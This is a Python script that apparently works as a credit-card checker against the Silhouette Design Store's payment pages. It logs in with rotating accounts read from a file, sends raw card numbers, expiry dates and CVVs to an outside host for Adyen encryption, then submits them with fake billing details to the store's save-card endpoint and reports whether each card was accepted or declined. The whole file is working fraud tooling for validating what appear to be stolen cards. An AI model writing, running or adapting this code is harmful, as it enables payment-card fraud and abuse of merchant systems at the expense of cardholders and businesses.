from urllib.parse import unquote
import requests
import re
from faker import Faker
import requests, re, random, string
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import random
import time
import string,json
import base64,user_agent,flagz
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import pycountry,jwt

with open("acc.txt", "r") as file:
    accounts = file.readlines()

index = 0


def get_next_account():
    global index
    if index < len(accounts):
        account = accounts[index].strip()
        index += 1
    else:
        index = 0 
        account = accounts[index].strip()
        index += 1

    email, password = account.split(":")

    return email, password



card_count = 0

email, password = get_next_account()


def Tele(ccx):
	global card_count, email, password
	card_count += 1

	if card_count > 4:
		card_count = 1  
		email, password = get_next_account() 

    
	ccx = ccx.strip().split('\n')[0]
	nn = ccx.split("|")[0]
	mmm = ccx.split("|")[1]
	yyy = ccx.split("|")[2]
	cvcc = ccx.split("|")[3]
    
	if "20" in yyy:
		yyy = yyy.split("20")[1]
    

	r = requests.Session()

	fake = Faker()
	ua = user_agent.generate_user_agent()

	headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'cache-control': 'max-age=0',
		'priority': 'u=0, i',
		'referer': 'https://www.silhouettedesignstore.com/customer/account/create',
		'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': ua,
	}

	response = r.get('https://www.silhouettedesignstore.com/customer/account/login/', headers=headers)

	soup = BeautifulSoup(response.content, 'html.parser')
	login_form = soup.find('form', {'id': 'login-form'})
	if login_form:
		login_form_key = login_form.find('input', {'name': 'form_key'})["value"]
	else:
		print("Login form not found!")


	cookies = {'form_key': login_form_key}


	headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://www.silhouettedesignstore.com',
		'priority': 'u=0, i',
		'referer': 'https://www.silhouettedesignstore.com/customer/account/login/',
		'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': ua,
	}

	data = {
		'form_key': login_form_key,
		'login[username]': email,
		'login[password]': password,
		'persistent_remember_me': 'on',
	}

	response = r.post(
		'https://www.silhouettedesignstore.com/customer/account/loginPost/',
		cookies=cookies,
		headers=headers,
		data=data,
	)

	headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'priority': 'u=0, i',
		'referer': 'https://www.silhouettedesignstore.com/customer/account/',
		'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': ua,
	}

	response = r.get(
		'https://www.silhouettedesignstore.com/nuvei_cards/payment/savedcards/',
		headers=headers,
	)


	headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'priority': 'u=0, i',
		'referer': 'https://www.silhouettedesignstore.com/customer/account/',
		'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': ua,
	}

	response = r.get('https://www.silhouettedesignstore.com/credit_cards/tokenize/adyen/', headers=headers)

	data = {
			"card": f"{nn}|{mmm}|20{yyy}|{cvcc}",
			"adyenKey": "10001|D8678F890C530DE746E05FD73D45C8071E31F3E60CFEB09296D6FAA3A712ECC80D0102FD4DBC1C718566A587129290D5230F51E4A038F4DC86F4F39C305B3886F6D88924E6387FCAF5BB37E0D3C723F3636E7146A2CE3C61D5D1FF800F36776BD9EEDD89837B5D01A6387DC822DD3E710C222CADA347CD92B5036BC15285F67DE9D14F0EC4C496E9470AA54B9992EBD7D5CCFC039290D1E21F68EC726649A74E02B2E6AF44FD65A53439A79C455B321D2D8B0E9AEDA2B6A69399149DCBF83A2FB70E258CC6265607C3134312D56FCAA5AFF83B0157CB3B4A8485F34F98B525B510498B5D82469F6761470595FA119510D2DE62379BB9A6D4653AEA7B2DB0773B",
			"version": "25",
			
		}

		
	headers = {
			'User-Agent': 'PostmanRuntime/7.31.1',
			'Content-Type': 'application/json'
		}
		
	response = requests.post('https://asianprozyy.us/encrypt/adyen', headers=headers, data=json.dumps(data))
		
	if response.status_code == 200:
		result = response.json()
		encrypted_card_number = result.get('encryptedCardNumber')
		encrypted_expiry_month = result.get('encryptedExpiryMonth')
		encrypted_expiry_year = result.get('encryptedExpiryYear')
		encrypted_security_code = result.get('encryptedSecurityCode')
		encrypted_card_data_cvv = result.get('encryptedCardDataCVV')
		encrypted_card_data_ccn = result.get('encryptedCardDataCCN')
	else:
		print(f"Failed to get a valid response. Status code: {response.status_code}")
		
	n = (encrypted_card_number)
		
	mm = (encrypted_expiry_month)
		
	yy = (encrypted_expiry_year)
		
	cvc = (encrypted_security_code)
		

	headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://www.silhouettedesignstore.com',
		'priority': 'u=0, i',
		'referer': 'https://www.silhouettedesignstore.com/credit_cards/tokenize/adyen/',
		'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': ua,
	}

	data = {
		'referer_url_value': '',
		'platform': 'adyen_cc',
		'cc_holder_name': fake.name(),
		'cc_cvv': cvc,
		'exp_month': mm,
		'exp_year': yy,
		'cc_number': n,
		'address': fake.street_address(),
		'address_two': fake.secondary_address() if random.choice([True, False]) else '',
		'city': fake.city(),
		'country_id': 'US',
		'region': str(random.randint(1, 50)),
		'state': fake.state_abbr(),
		'postal_code': fake.zipcode(),
		'phone': fake.phone_number(),
		'cc_term_con': 'on',
		'form_key': login_form_key,
	}

	response = r.post(
		'https://www.silhouettedesignstore.com/nuvei_cards/index/savecard/',
		headers=headers,
		data=data,
	)

	mes = (r.cookies.get_dict()['mage-messages'])
	text = unquote(mes)

	data = json.loads(text)


	for item in data:
		type_value = item.get('type', 'No type found')
		text_value = item.get('text', 'No text found')
		if type_value == 'success':
			return 'Card has been added successfully'
		elif 'CVC Declined' in text_value:
			return 'CVC Declined'

		else:
			return text_value
